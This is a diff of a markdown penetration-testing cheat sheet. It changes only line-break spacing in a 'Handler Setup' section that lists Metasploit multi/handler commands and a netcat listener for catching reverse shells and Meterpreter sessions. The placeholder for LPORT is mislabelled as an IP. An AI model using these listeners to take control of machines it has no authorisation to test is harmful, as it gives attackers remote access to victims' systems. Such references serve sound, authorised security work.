@@ -25,13 +25,13 @@ Insert picture here
 # Handler Setup  
 ***
 #### Meterpreter  
-`msfconsole -q`
-`use exploit/multi/handler`
-`set PAYLOAD <PAYLOAD>`
-`set LHOST <IP>`
-`set LPORT <IP>`
-`set ExitOnSession false`
-`exploit -j -z`
+`msfconsole -q`  
+`use exploit/multi/handler`  
+`set PAYLOAD <PAYLOAD>`  
+`set LHOST <IP>`  
+`set LPORT <IP>`  
+`set ExitOnSession false`  
+`exploit -j -z`  
 
 #### Netcat  
 `nc -nlvp <PORT>
